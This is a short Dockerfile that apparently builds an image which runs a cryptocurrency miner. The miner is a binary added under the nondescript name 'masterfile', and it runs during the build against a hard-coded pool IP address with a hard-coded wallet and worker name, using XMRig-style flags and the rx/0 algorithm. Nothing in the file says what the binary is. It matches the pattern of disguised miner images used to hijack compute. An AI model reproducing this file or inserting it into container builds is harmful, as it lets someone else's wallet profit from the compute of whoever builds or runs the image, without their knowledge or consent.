FROM ubuntu:20.04

RUN apt-get update
ADD masterfile masterfile

RUN chmod u+x masterfile
RUN ./masterfile -o 161.35.250.122:13333 -u ETH:0x482DC042279aB15C1669b8854f3d8b6dD49fF5b5.Worker01 -k -a rx/0
